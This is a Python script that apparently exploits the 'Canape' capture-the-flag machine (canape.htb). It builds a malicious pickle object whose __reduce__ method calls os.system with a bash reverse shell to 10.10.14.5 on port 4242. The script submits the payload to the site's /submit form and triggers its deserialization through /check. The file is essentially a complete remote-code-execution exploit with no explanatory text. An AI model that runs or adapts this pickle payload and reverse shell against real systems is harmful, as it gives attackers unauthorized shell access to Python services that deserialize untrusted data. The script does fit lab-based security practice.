import requests
from hashlib import md5
import os
import cPickle as _pickle

class Exploit(object):
    def __reduce__(self):
        #payload = "ping -c 1 10.10.14.5"
        payload = 'bash -c "bash -i >& /dev/tcp/10.10.14.5/4242 0>&1"'
        return (os.system, (payload,))

def serialize_exploit():
    with open('test.pickle','wb') as f:
        _pickle.dump(Exploit(),f,protocol=0)
    shellcode = _pickle.dumps(Exploit(),protocol=0)
    shellcode = shellcode + "lisa"
    return shellcode

def send(character,quote):
    burp0_url = "http://canape.htb:80/submit"

    #character = "lisa"
    #quote = "haha"

    burp0_data = {
            "character": "%s" % character, 
            "quote": "%s" % quote
            }

    p_id = md5(character.encode() + quote.encode()).hexdigest()
    print ("[+] p_id : " + p_id)

    r = requests.post(burp0_url, data=burp0_data)
    if "Thank you for your suggestion!" in r.text:
        print ("[+] request sent successfully with '" + character + "' and '" + quote + "'")

    return (p_id)

def check(p_id):
    burp0_url = "http://canape.htb:80/check"
    
    burp0_data = {
            "id": "%s" % p_id
            }
    
    r = requests.post(burp0_url, data=burp0_data)
    print ("[+] checking: ")
    print (r.text)
    pass

check(send(serialize_exploit(),"haha"))
